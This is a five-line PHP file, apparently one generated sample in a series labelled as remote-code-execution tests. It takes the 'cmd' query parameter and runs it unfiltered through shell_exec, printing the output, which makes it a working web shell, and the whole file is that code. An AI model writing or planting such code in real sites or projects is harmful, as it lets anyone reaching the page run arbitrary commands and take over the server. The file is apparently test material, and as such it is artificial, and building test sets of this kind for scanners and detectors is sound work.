<?php
// RCE test variation #825
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>